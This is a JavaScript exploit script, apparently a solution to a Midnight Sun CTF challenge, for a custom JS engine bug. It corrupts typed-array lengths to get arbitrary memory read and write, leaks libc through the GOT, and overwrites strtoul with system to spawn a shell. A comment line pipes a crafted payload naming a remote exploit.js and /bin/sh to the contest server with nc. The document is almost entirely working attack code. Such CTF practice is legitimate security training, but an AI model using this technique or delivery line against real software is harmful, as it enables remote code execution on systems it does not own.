// (python -c "print '1'.ljust(0x28,'\x00')+'http://192.168.199.130/exploit.js'.ljust(0xc8,'\x00')+'/bin/sh'"; cat) | nc pwn.midnightsunctf.se 31337
const addr_got_strtoul    = 0x080ccd80
const offset_libc_strtoul = 0x00031f00
const offset_libc_system  = 0x0003cd60

function exploit() {
	console.log("[*] Fill heap hole")
	var arr = []
	for(var i=0; i<0x10; i++)
		arr[i] = new ArrayBuffer(0x8);

	console.log("[*] Allocate 0x8 byte Uint32Array")
	var u32a1 = new Uint32Array(2);
	for(var i=0; i<u32a1.length; i++)
		u32a1[i] = 0x11111111;

	console.log("[*] Allocate 0x8 byte Uint32Array")
	var u32a2 = new Uint32Array(2);
	for(var i=0; i<u32a2.length; i++)
		u32a2[i] = 0x22222222;

	console.log('[*] Trigger the vuln');
	console.log('u32a1.length = 0x1e9a (0x7a69 byte)');
	u32a1.midnight()

	console.log('u32a2.length = 0x3fffffff (0xffffffff byte)');
	u32a1[0x4c/4] = 0xffffffff
	u32a1[0x68/4] = 0xffffffff

	console.log("[+] u32a1.length = "+u32a1.length, ", u32a2.length = "+u32a2.length)

	var addr_u32a2 = u32a1[0x20/4] + 0x18
	var read_mem  = function (addr){ return u32a2[(addr - addr_u32a2 + (addr > addr_u32a2 ? 0 : 0x100000000))/4] }
	var write_mem = function (addr, val){ u32a2[(addr - addr_u32a2 + (addr > addr_u32a2 ? 0 : 0x100000000))/4] = val }
	console.log("[+] addr_u32a2 = 0x"+addr_u32a2.toString(0x10))

	var addr_libc_strtoul = read_mem(addr_got_strtoul)
	var addr_libc_base    = addr_libc_strtoul - offset_libc_strtoul
	var addr_libc_system  = addr_libc_base + offset_libc_system
	console.log("[+] addr_libc_base = 0x"+addr_libc_base.toString(0x10))

	console.log('[*] Overwrite strtoul@got to system');
	write_mem(addr_got_strtoul, addr_libc_system)
}

exploit();
